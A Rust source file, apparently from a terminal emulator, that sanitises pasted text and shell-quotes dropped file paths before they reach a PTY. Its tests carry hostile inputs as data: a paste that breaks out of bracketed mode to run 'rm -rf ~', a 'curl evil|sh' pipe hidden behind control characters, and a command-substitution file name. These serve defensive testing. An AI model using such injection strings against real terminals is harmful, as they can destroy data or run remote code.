//! 붙여넣기·파일 드롭이 PTY에 보낼 바이트(MK-033).

use krill_proto::term_modes::Modes;

const PASTE_START: &[u8] = b"\x1b[200~";
const PASTE_END: &[u8] = b"\x1b[201~";

/// 붙여넣을 텍스트 → PTY 바이트.
///
/// - bracketed paste 모드면 `ESC[200~`…`ESC[201~`로 감싼다. 본문의 ESC와 `^C`는 지운다: 본문이 끝 표시를 흉내 내
///   나머지를 명령으로 실행시키거나, 붙여넣기 도중 프로그램을 끊지 못하게.
/// - 아니면 줄바꿈(`\r\n`·`\n`)을 Enter와 같은 `\r`로 바꾼다. AS-13: 나머지 C0 제어문자
///   (`^U`·`^O` 등)와 DEL은 버린다 — bash 3.2 등에서 줄 편집 명령으로 실행된다. `\t`는 살린다.
pub fn paste(text: &[u8], modes: Modes) -> Vec<u8> {
    if modes.contains(Modes::BRACKETED_PASTE) {
        let mut out = PASTE_START.to_vec();
        out.extend(text.iter().filter(|&&b| b != 0x1b && b != 0x03));
        out.extend_from_slice(PASTE_END);
        return out;
    }
    let mut out = Vec::with_capacity(text.len());
    let mut it = text.iter().peekable();
    while let Some(&b) = it.next() {
        if b == b'\r' && it.peek() == Some(&&b'\n') {
            continue;
        }
        if b == b'\n' {
            out.push(b'\r');
        } else if b == b'\t' || b == b'\r' || b >= 0x20 && b != 0x7f {
            out.push(b);
        }
    }
    out
}

/// 경로 하나를 셸 인자 하나로. 흔한 안전 글자만이면 그대로, 아니면 작은따옴표로 감싸고 안의 `'`는 `'\''`로.
/// sh·bash·zsh 모두 작은따옴표 안을 글자 그대로 읽는다.
pub fn shell_quote(path: &[u8]) -> Vec<u8> {
    let safe = |b: &u8| b.is_ascii_alphanumeric() || b"/._-+,:@%=".contains(b);
    if !path.is_empty() && path.iter().all(safe) {
        return path.to_vec();
    }
    let mut out = vec![b'\''];
    for &b in path {
        if b == b'\'' {
            out.extend_from_slice(b"'\\''");
        } else {
            out.push(b);
        }
    }
    out.push(b'\'');
    out
}

/// 드롭한 경로들 → 셸 인자를 공백으로 이은 텍스트(끝에 공백 하나, 이어서 칠 수 있게). [`paste`]로 보낸다.
pub fn dropped<'a>(paths: impl IntoIterator<Item = &'a [u8]>) -> Vec<u8> {
    let mut out = Vec::new();
    for p in paths {
        out.extend(shell_quote(p));
        out.push(b' ');
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use krill_proto::os::ffi::OsStrExt as _;
    use std::process::Command;

    fn bracketed() -> Modes {
        Modes {
            kitty: 0,
            flags: Modes::BRACKETED_PASTE,
        }
    }

    #[test]
    fn bracketed_wraps_and_strips_escape_and_ctrl_c() {
        assert_eq!(
            paste(b"ls\n\x1b[201~rm -rf ~\x03\n", bracketed()),
            b"\x1b[200~ls\n[201~rm -rf ~\n\x1b[201~"
        );
        assert_eq!(paste(b"a\r\nb\nc\rd", Modes::default()), b"a\rb\rc\rd");
    }

    #[test]
    fn quote_rules() {
        assert_eq!(shell_quote(b"/tmp/a-b_c.txt"), b"/tmp/a-b_c.txt");
        assert_eq!(shell_quote(b"/tmp/a b"), b"'/tmp/a b'");
        assert_eq!(shell_quote(b"it's"), b"'it'\\''s'");
        assert_eq!(shell_quote(b""), b"''");
        assert_eq!(dropped([&b"/a"[..], b"/b c"]), b"/a '/b c' ");
    }

    /// AS-13: bracketed paste가 꺼진 상태에서는 C0 제어문자를 버린다.
    /// 파일명·텍스트의 `^U`(줄 지움)·`^O` 등이 bash 줄 편집 명령으로 실행되는 것을 막는다.
    /// `\t`·`\n`·`\r`은 살리고, DEL(지움)도 버린다.
    #[test]
    fn unbracketed_strips_c0_controls() {
        assert_eq!(
            paste(b"/tmp/x\x15curl evil|\x0fsh\x07", Modes::default()),
            b"/tmp/xcurl evil|sh"
        );
        assert_eq!(paste(b"a\x7fb", Modes::default()), b"ab");
        assert_eq!(paste(b"a\tb\nc\rd", Modes::default()), b"a\tb\rc\rd");
    }

    /// 완료 조건: 공백·따옴표(와 셸 특수 문자·한글)가 든 경로를 드롭한 텍스트가 셸에서 그 파일들로 열린다.
    #[test]
    fn dropped_paths_open_in_shells() {
        let dir = std::env::temp_dir().join(format!("mk033 drop '\"{}", std::process::id()));
        std::fs::remove_dir_all(&dir).ok();
        std::fs::create_dir_all(&dir).unwrap();
        let names = [
            "a b.txt",
            "it's.txt",
            "say \"hi\".txt",
            "$(touch pwned) `x` *;&|.txt",
            "한글 파일.txt",
            "plain.txt",
        ];
        let paths: Vec<_> = names.iter().map(|n| dir.join(n)).collect();
        for (i, p) in paths.iter().enumerate() {
            std::fs::write(p, format!("{i};")).unwrap();
        }
        let args = dropped(paths.iter().map(|p| p.as_os_str().as_bytes()));
        let want: String = (0..names.len()).map(|i| i.to_string() + ";").collect();
        let script = [&b"cat "[..], &args].concat();
        let script = std::str::from_utf8(&script).unwrap();
        for shell in ["/bin/sh", "/bin/bash", "/bin/zsh"] {
            if !std::path::Path::new(shell).exists() {
                continue;
            }
            let out = Command::new(shell)
                .args(["-c", script])
                .current_dir(&dir)
                .output()
                .unwrap();
            assert!(out.status.success(), "{shell}: {out:?}");
            assert_eq!(String::from_utf8_lossy(&out.stdout), want, "{shell}");
        }
        assert!(!dir.join("pwned").exists());
        std::fs::remove_dir_all(&dir).ok();
    }
}
